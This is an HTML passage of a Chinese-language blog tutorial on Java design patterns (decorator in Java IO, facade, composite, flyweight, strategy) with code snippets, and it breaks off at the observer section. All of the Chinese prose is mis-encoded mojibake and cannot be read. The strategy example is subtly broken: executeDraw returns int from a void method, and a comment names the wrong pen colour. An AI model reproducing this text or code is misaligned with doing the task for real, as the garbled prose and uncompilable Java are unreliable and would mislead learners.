src="https://www.javadoop.com/blogimages/design-pattern/decorator-2.png" alt="decorator-2"></p><p>åˆ°è¿™é‡Œï¼Œå¤§å®¶åº”è¯¥å·²ç»æ¸…æ¥šè£…é¥°æ¨¡å¼äº†å§ã€‚</p><p>ä¸‹é¢ï¼Œæˆ‘ä»¬å†æ¥è¯´è¯´ java IO ä¸­çš„è£…é¥°æ¨¡å¼ã€‚çœ‹ä¸‹å›¾ InputStream æ´¾ç”Ÿå‡ºæ¥çš„éƒ¨åˆ†ç±»ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/decorator-3.png" alt="decorator-3"></p><p>æˆ‘ä»¬çŸ¥é“ InputStream ä»£è¡¨äº†è¾“å…¥æµï¼Œå…·ä½“çš„è¾“å…¥æ¥æºå¯ä»¥æ˜¯æ–‡ä»¶ï¼ˆFileInputStreamï¼‰ã€ç®¡é“ï¼ˆPipedInputStreamï¼‰ã€æ•°ç»„ï¼ˆByteArrayInputStreamï¼‰ç­‰ï¼Œè¿™äº›å°±åƒå‰é¢å¥¶èŒ¶çš„ä¾‹å­ä¸­çš„çº¢èŒ¶ã€ç»¿èŒ¶ï¼Œå±äºåŸºç¡€è¾“å…¥æµã€‚</p><p>FilterInputStream æ‰¿æ¥äº†è£…é¥°æ¨¡å¼çš„å…³é”®èŠ‚ç‚¹ï¼Œå®ƒçš„å®ç°ç±»æ˜¯ä¸€ç³»åˆ—è£…é¥°å™¨ï¼Œæ¯”å¦‚ BufferedInputStream ä»£è¡¨ç”¨ç¼“å†²æ¥è£…é¥°ï¼Œä¹Ÿå°±ä½¿å¾—è¾“å…¥æµå…·æœ‰äº†ç¼“å†²çš„åŠŸèƒ½ï¼ŒLineNumberInputStream ä»£è¡¨ç”¨è¡Œå·æ¥è£…é¥°ï¼Œåœ¨æ“ä½œçš„æ—¶å€™å°±å¯ä»¥å–å¾—è¡Œå·äº†ï¼ŒDataInputStream çš„è£…é¥°ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ä»è¾“å…¥æµè½¬æ¢ä¸º java ä¸­çš„åŸºæœ¬ç±»å‹å€¼ã€‚</p><p>å½“ç„¶ï¼Œåœ¨ java IO ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨è£…é¥°å™¨çš„è¯ï¼Œå°±ä¸å¤ªé€‚åˆé¢å‘æ¥å£ç¼–ç¨‹äº†ï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineNumberInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;&quot;</span>)));</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„ç»“æœæ˜¯ï¼ŒInputStream è¿˜æ˜¯ä¸å…·æœ‰è¯»å–è¡Œå·çš„åŠŸèƒ½ï¼Œå› ä¸ºè¯»å–è¡Œå·çš„æ–¹æ³•å®šä¹‰åœ¨ LineNumberInputStream ç±»ä¸­ã€‚</p><p>æˆ‘ä»¬åº”è¯¥åƒä¸‹é¢è¿™æ ·ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DataInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(</span><br><span class="line">                              <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;&quot;</span>)));</span><br></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥è¯´å˜›ï¼Œè¦æ‰¾åˆ°çº¯çš„ä¸¥æ ¼ç¬¦åˆè®¾è®¡æ¨¡å¼çš„ä»£ç è¿˜æ˜¯æ¯”è¾ƒéš¾çš„ã€‚</p></blockquote><h3><span id="é—¨é¢æ¨¡å¼">é—¨é¢æ¨¡å¼</span></h3><p>é—¨é¢æ¨¡å¼ï¼ˆä¹Ÿå«å¤–è§‚æ¨¡å¼ï¼ŒFacade Patternï¼‰åœ¨è®¸å¤šæºç ä¸­æœ‰ä½¿ç”¨ï¼Œæ¯”å¦‚ slf4j å°±å¯ä»¥ç†è§£ä¸ºæ˜¯é—¨é¢æ¨¡å¼çš„åº”ç”¨ã€‚è¿™æ˜¯ä¸€ä¸ªç®€å•çš„è®¾è®¡æ¨¡å¼ï¼Œæˆ‘ä»¬ç›´æ¥ä¸Šä»£ç å†è¯´å§ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰å‡ ä¸ªå®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;Circle::draw()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;Rectangle::draw()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// ç”»ä¸€ä¸ªåœ†å½¢</span></span><br><span class="line">  <span class="type">Shape</span> <span class="variable">circle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">  circle.draw();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ç”»ä¸€ä¸ªé•¿æ–¹å½¢</span></span><br><span class="line">  <span class="type">Shape</span> <span class="variable">rectangle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">  rectangle.draw();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯æˆ‘ä»¬å¸¸å†™çš„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦ç”»åœ†å°±è¦å…ˆå®ä¾‹åŒ–åœ†ï¼Œç”»é•¿æ–¹å½¢å°±éœ€è¦å…ˆå®ä¾‹åŒ–ä¸€ä¸ªé•¿æ–¹å½¢ï¼Œç„¶åå†è°ƒç”¨ç›¸åº”çš„ draw() æ–¹æ³•ã€‚</p><p>ä¸‹é¢ï¼Œæˆ‘ä»¬çœ‹çœ‹æ€ä¹ˆç”¨é—¨é¢æ¨¡å¼æ¥è®©å®¢æˆ·ç«¯è°ƒç”¨æ›´åŠ å‹å¥½ä¸€äº›ã€‚</p><p>æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ªé—¨é¢ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeMaker</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Shape circle;</span><br><span class="line">   <span class="keyword">private</span> Shape rectangle;</span><br><span class="line">   <span class="keyword">private</span> Shape square;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">ShapeMaker</span><span class="params">()</span> &#123;</span><br><span class="line">      circle = <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">      rectangle = <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">      square = <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * ä¸‹é¢å®šä¹‰ä¸€å †æ–¹æ³•ï¼Œå…·ä½“åº”è¯¥è°ƒç”¨ä»€ä¹ˆæ–¹æ³•ï¼Œç”±è¿™ä¸ªé—¨é¢æ¥å†³å®š</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">drawCircle</span><span class="params">()</span>&#123;</span><br><span class="line">      circle.draw();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">drawRectangle</span><span class="params">()</span>&#123;</span><br><span class="line">      rectangle.draw();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">drawSquare</span><span class="params">()</span>&#123;</span><br><span class="line">      square.draw();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹ç°åœ¨å®¢æˆ·ç«¯æ€ä¹ˆè°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">  <span class="type">ShapeMaker</span> <span class="variable">shapeMaker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShapeMaker</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®¢æˆ·ç«¯è°ƒç”¨ç°åœ¨æ›´åŠ æ¸…æ™°äº†</span></span><br><span class="line">  shapeMaker.drawCircle();</span><br><span class="line">  shapeMaker.drawRectangle();</span><br><span class="line">  shapeMaker.drawSquare();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—¨é¢æ¨¡å¼çš„ä¼˜ç‚¹æ˜¾è€Œæ˜“è§ï¼Œå®¢æˆ·ç«¯ä¸å†éœ€è¦å…³æ³¨å®ä¾‹åŒ–æ—¶åº”è¯¥ä½¿ç”¨å“ªä¸ªå®ç°ç±»ï¼Œç›´æ¥è°ƒç”¨é—¨é¢æä¾›çš„æ–¹æ³•å°±å¯ä»¥äº†ï¼Œå› ä¸ºé—¨é¢ç±»æä¾›çš„æ–¹æ³•çš„æ–¹æ³•åå¯¹äºå®¢æˆ·ç«¯æ¥è¯´å·²ç»å¾ˆå‹å¥½äº†ã€‚</p><h3><span id="ç»„åˆæ¨¡å¼">ç»„åˆæ¨¡å¼</span></h3><p>ç»„åˆæ¨¡å¼ç”¨äºè¡¨ç¤ºå…·æœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®ï¼Œä½¿å¾—æˆ‘ä»¬å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„è®¿é—®å…·æœ‰ä¸€è‡´æ€§ã€‚</p><p>ç›´æ¥çœ‹ä¸€ä¸ªä¾‹å­å§ï¼Œæ¯ä¸ªå‘˜å·¥éƒ½æœ‰å§“åã€éƒ¨é—¨ã€è–ªæ°´è¿™äº›å±æ€§ï¼ŒåŒæ—¶è¿˜æœ‰ä¸‹å±å‘˜å·¥é›†åˆï¼ˆè™½ç„¶å¯èƒ½é›†åˆä¸ºç©ºï¼‰ï¼Œè€Œä¸‹å±å‘˜å·¥å’Œè‡ªå·±çš„ç»“æ„æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿæœ‰å§“åã€éƒ¨é—¨è¿™äº›å±æ€§ï¼ŒåŒæ—¶ä¹Ÿæœ‰ä»–ä»¬çš„ä¸‹å±å‘˜å·¥é›†åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String dept;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> salary;</span><br><span class="line">   <span class="keyword">private</span> List&lt;Employee&gt; subordinates; <span class="comment">// ä¸‹å±</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Employee</span><span class="params">(String name,String dept, <span class="type">int</span> sal)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">      <span class="built_in">this</span>.dept = dept;</span><br><span class="line">      <span class="built_in">this</span>.salary = sal;</span><br><span class="line">      subordinates = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Employee&gt;();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Employee e)</span> &#123;</span><br><span class="line">      subordinates.add(e);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Employee e)</span> &#123;</span><br><span class="line">      subordinates.remove(e);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> List&lt;Employee&gt; <span class="title function_">getSubordinates</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">return</span> subordinates;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (<span class="string">&quot;Employee :[ Name : &quot;</span> + name + <span class="string">&quot;, dept : &quot;</span> + dept + <span class="string">&quot;, salary :&quot;</span> + salary+<span class="string">&quot; ]&quot;</span>);</span><br><span class="line">   &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šå¸¸ï¼Œè¿™ç§ç±»éœ€è¦å®šä¹‰ add(node)ã€remove(node)ã€getChildren() è¿™äº›æ–¹æ³•ã€‚</p><p>è¿™è¯´çš„å…¶å®å°±æ˜¯ç»„åˆæ¨¡å¼ï¼Œè¿™ç§ç®€å•çš„æ¨¡å¼æˆ‘å°±ä¸åšè¿‡å¤šä»‹ç»äº†ï¼Œç›¸ä¿¡å„ä½è¯»è€…ä¹Ÿä¸å–œæ¬¢çœ‹æˆ‘å†™åºŸè¯ã€‚</p><h3><span id="äº«å…ƒæ¨¡å¼">äº«å…ƒæ¨¡å¼</span></h3><p>è‹±æ–‡æ˜¯ Flyweight Patternï¼Œä¸çŸ¥é“æ˜¯è°æœ€å…ˆç¿»è¯‘çš„è¿™ä¸ªè¯ï¼Œæ„Ÿè§‰è¿™ç¿»è¯‘çœŸçš„ä¸å¥½ç†è§£ï¼Œæˆ‘ä»¬è¯•ç€å¼ºè¡Œå…³è”èµ·æ¥å§ã€‚Flyweight æ˜¯è½»é‡çº§çš„æ„æ€ï¼Œäº«å…ƒåˆ†å¼€æ¥è¯´å°±æ˜¯ å…±äº« å…ƒå™¨ä»¶ï¼Œä¹Ÿå°±æ˜¯å¤ç”¨å·²ç»ç”Ÿæˆçš„å¯¹è±¡ï¼Œè¿™ç§åšæ³•å½“ç„¶ä¹Ÿå°±æ˜¯è½»é‡çº§çš„äº†ã€‚</p><p>å¤ç”¨å¯¹è±¡æœ€ç®€å•çš„æ–¹å¼æ˜¯ï¼Œç”¨ä¸€ä¸ª HashMap æ¥å­˜æ”¾æ¯æ¬¡æ–°ç”Ÿæˆçš„å¯¹è±¡ã€‚æ¯æ¬¡éœ€è¦ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œå…ˆåˆ° HashMap ä¸­çœ‹çœ‹æœ‰æ²¡æœ‰ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå†ç”Ÿæˆæ–°çš„å¯¹è±¡ï¼Œç„¶åå°†è¿™ä¸ªå¯¹è±¡æ”¾å…¥ HashMap ä¸­ã€‚</p><p>è¿™ç§ç®€å•çš„ä»£ç æˆ‘å°±ä¸æ¼”ç¤ºäº†ã€‚</p><h3><span id="ç»“æ„å‹æ¨¡å¼æ€»ç»“">ç»“æ„å‹æ¨¡å¼æ€»ç»“</span></h3><p>å‰é¢ï¼Œæˆ‘ä»¬è¯´äº†ä»£ç†æ¨¡å¼ã€é€‚é…å™¨æ¨¡å¼ã€æ¡¥æ¢æ¨¡å¼ã€è£…é¥°æ¨¡å¼ã€é—¨é¢æ¨¡å¼ã€ç»„åˆæ¨¡å¼å’Œäº«å…ƒæ¨¡å¼ã€‚è¯»è€…æ˜¯å¦å¯ä»¥åˆ†åˆ«æŠŠè¿™å‡ ä¸ªæ¨¡å¼è¯´æ¸…æ¥šäº†å‘¢ï¼Ÿåœ¨è¯´åˆ°è¿™äº›æ¨¡å¼çš„æ—¶å€™ï¼Œå¿ƒä¸­æ˜¯å¦æœ‰ä¸€ä¸ªæ¸…æ™°çš„å›¾æˆ–å¤„ç†æµç¨‹åœ¨è„‘æµ·é‡Œå‘¢ï¼Ÿ</p><p>ä»£ç†æ¨¡å¼æ˜¯åšæ–¹æ³•å¢å¼ºçš„ï¼Œé€‚é…å™¨æ¨¡å¼æ˜¯æŠŠé¸¡åŒ…è£…æˆé¸­è¿™ç§ç”¨æ¥é€‚é…æ¥å£çš„ï¼Œæ¡¥æ¢æ¨¡å¼åšåˆ°äº†å¾ˆå¥½çš„è§£è€¦ï¼Œè£…é¥°æ¨¡å¼ä»åå­—ä¸Šå°±çœ‹å¾—å‡ºæ¥ï¼Œé€‚åˆäºè£…é¥°ç±»æˆ–è€…è¯´æ˜¯å¢å¼ºç±»çš„åœºæ™¯ï¼Œé—¨é¢æ¨¡å¼çš„ä¼˜ç‚¹æ˜¯å®¢æˆ·ç«¯ä¸éœ€è¦å…³å¿ƒå®ä¾‹åŒ–è¿‡ç¨‹ï¼Œåªè¦è°ƒç”¨éœ€è¦çš„æ–¹æ³•å³å¯ï¼Œç»„åˆæ¨¡å¼ç”¨äºæè¿°å…·æœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®ï¼Œäº«å…ƒæ¨¡å¼æ˜¯ä¸ºäº†åœ¨ç‰¹å®šçš„åœºæ™¯ä¸­ç¼“å­˜å·²ç»åˆ›å»ºçš„å¯¹è±¡ï¼Œç”¨äºæé«˜æ€§èƒ½ã€‚</p><h2><span id="è¡Œä¸ºå‹æ¨¡å¼">è¡Œä¸ºå‹æ¨¡å¼</span></h2><p>è¡Œä¸ºå‹æ¨¡å¼å…³æ³¨çš„æ˜¯å„ä¸ªç±»ä¹‹é—´çš„ç›¸äº’ä½œç”¨ï¼Œå°†èŒè´£åˆ’åˆ†æ¸…æ¥šï¼Œä½¿å¾—æˆ‘ä»¬çš„ä»£ç æ›´åŠ åœ°æ¸…æ™°ã€‚</p><h3><span id="ç­–ç•¥æ¨¡å¼">ç­–ç•¥æ¨¡å¼</span></h3><p>ç­–ç•¥æ¨¡å¼å¤ªå¸¸ç”¨äº†ï¼Œæ‰€ä»¥æŠŠå®ƒæ”¾åˆ°æœ€å‰é¢è¿›è¡Œä»‹ç»ã€‚å®ƒæ¯”è¾ƒç®€å•ï¼Œæˆ‘å°±ä¸åºŸè¯ï¼Œç›´æ¥ç”¨ä»£ç è¯´äº‹å§ã€‚</p><p>ä¸‹é¢è®¾è®¡çš„åœºæ™¯æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦ç”»ä¸€ä¸ªå›¾å½¢ï¼Œå¯é€‰çš„ç­–ç•¥å°±æ˜¯ç”¨çº¢è‰²ç¬”æ¥ç”»ï¼Œè¿˜æ˜¯ç»¿è‰²ç¬”æ¥ç”»ï¼Œæˆ–è€…è“è‰²ç¬”æ¥ç”»ã€‚</p><p>é¦–å…ˆï¼Œå…ˆå®šä¹‰ä¸€ä¸ªç­–ç•¥æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å®šä¹‰å…·ä½“çš„å‡ ä¸ªç­–ç•¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedPen</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;ç”¨çº¢è‰²ç¬”ç”»å›¾ï¼Œradius:&quot;</span> + radius + <span class="string">&quot;, x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreenPen</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;ç”¨ç»¿è‰²ç¬”ç”»å›¾ï¼Œradius:&quot;</span> + radius + <span class="string">&quot;, x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BluePen</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;ç”¨è“è‰²ç¬”ç”»å›¾ï¼Œradius:&quot;</span> + radius + <span class="string">&quot;, x:&quot;</span> + x + <span class="string">&quot;, y:&quot;</span> + y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç­–ç•¥çš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Context</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Strategy strategy;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Context</span><span class="params">(Strategy strategy)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.strategy = strategy;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">executeDraw</span><span class="params">(<span class="type">int</span> radius, <span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> strategy.draw(radius, x, y);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯æ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Context</span>(<span class="keyword">new</span> <span class="title class_">BluePen</span>()); <span class="comment">// ä½¿ç”¨ç»¿è‰²ç¬”æ¥ç”»</span></span><br><span class="line">  context.executeDraw(<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¾åˆ°ä¸€å¼ å›¾ä¸Šï¼Œè®©å¤§å®¶çœ‹å¾—æ¸…æ™°äº›ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/strategy-1.png" alt="strategy-1"></p><p>è¿™ä¸ªæ—¶å€™ï¼Œå¤§å®¶æœ‰æ²¡æœ‰è”æƒ³åˆ°ç»“æ„å‹æ¨¡å¼ä¸­çš„æ¡¥æ¢æ¨¡å¼ï¼Œå®ƒä»¬å…¶å®éå¸¸ç›¸ä¼¼ï¼Œæˆ‘æŠŠæ¡¥æ¢æ¨¡å¼çš„å›¾æ‹¿è¿‡æ¥å¤§å®¶å¯¹æ¯”ä¸‹ï¼š</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/bridge-1.png" alt="bridge-1"></p><p>è¦æˆ‘è¯´çš„è¯ï¼Œå®ƒä»¬éå¸¸ç›¸ä¼¼ï¼Œæ¡¥æ¢æ¨¡å¼åœ¨å·¦ä¾§åŠ äº†ä¸€å±‚æŠ½è±¡è€Œå·²ã€‚æ¡¥æ¢æ¨¡å¼çš„è€¦åˆæ›´ä½ï¼Œç»“æ„æ›´å¤æ‚ä¸€äº›ã€‚</p><h3><span id="è§‚å¯Ÿè€…æ¨¡å¼">è§‚å¯Ÿè€…æ¨¡å¼</span></h3><p>è§‚å¯Ÿè€…æ¨¡å¼å¯¹äºæˆ‘ä»¬æ¥è¯´ï¼ŒçœŸæ˜¯å†ç®€å•ä¸è¿‡äº†ã€‚æ— 